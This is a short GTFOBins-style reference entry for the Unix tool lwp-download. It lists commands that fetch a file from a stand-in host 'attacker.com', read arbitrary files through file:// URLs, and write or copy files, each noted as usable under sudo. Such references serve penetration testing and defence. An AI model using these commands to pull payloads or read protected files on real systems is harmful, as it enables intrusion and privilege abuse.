---
type: gtfobin
name: lwp-download
platform: Unix
functions: [download, file-read, file-write]
tags: [gtfobin, unix, lotl]
---

# lwp-download

## download

```bash
lwp-download http://attacker.com/path/to/input-file /path/to/output-file
```
_The destination file `/path/to/output-file` can be omitted, in that case the file is saved to `input-file` in the current working directory._
**Contexts:** sudo, unprivileged

## file-read

```bash
lwp-download file:///path/to/input-file /dev/stdout
```
**Contexts:** sudo, unprivileged

## file-write

```bash
echo DATA >/path/to/temp-file
lwp-download file:///path/to/temp-file /path/to/output-file
```
**Contexts:** sudo, unprivileged

```bash
lwp-download file:///path/to/input-file /path/to/output-file
```
_This actually copies a file to a destination._
**Contexts:** sudo, unprivileged
